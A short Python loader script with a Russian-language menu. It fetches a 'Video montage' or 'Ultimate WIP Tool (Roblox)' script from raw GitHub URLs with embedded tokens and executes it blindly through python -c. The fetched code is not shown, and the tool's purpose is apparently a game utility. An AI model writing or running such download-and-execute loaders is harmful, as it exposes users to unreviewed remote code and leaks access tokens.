import pyfiglet
import os

def main():
    os.system("cls")
    ascii_art = pyfiglet.figlet_format("Loader", font="slant")
    print(ascii_art)

    print("Выбери опцию:")
    print("1. Video montage")
    print("2. Ultimate WIP Tool (Roblox)")


    choice = input("Введите номер выбранной опции: ")

    if choice == "1":
        # Здесь нужно указать ссылку на GitHub для Video montage
        github_url = "https://raw.githubusercontent.com/RBXROBLOXGAMER/python-tools/main/montage?token=GHSAT0AAAAAACTUT4RRPXZUO7GYX5AXQAPAZTMS7DA"
        run_from_github(github_url)
    elif choice == "2":
        # Здесь нужно указать ссылку на GitHub для Ultimate WIP Tool (Roblox)
        github_url = "https://raw.githubusercontent.com/RBXROBLOXGAMER/python-tools/main/roblox?token=GHSAT0AAAAAACTUT4RR3BD74YNHMPXRBA4WZTMTAZQ"
        
        run_from_github(github_url)
    else:
        print("Некорректный выбор. Пожалуйста, выбери 1 или 2.")

def run_from_github(url):
    import urllib.request
    import subprocess

    try:
        response = urllib.request.urlopen(url)
        script_content = response.read().decode('utf-8')
        subprocess.run(['python', '-c', script_content])
    except Exception as e:
        print(f"Ошибка при выполнении скрипта с GitHub: {e}")

if __name__ == "__main__":
    main()
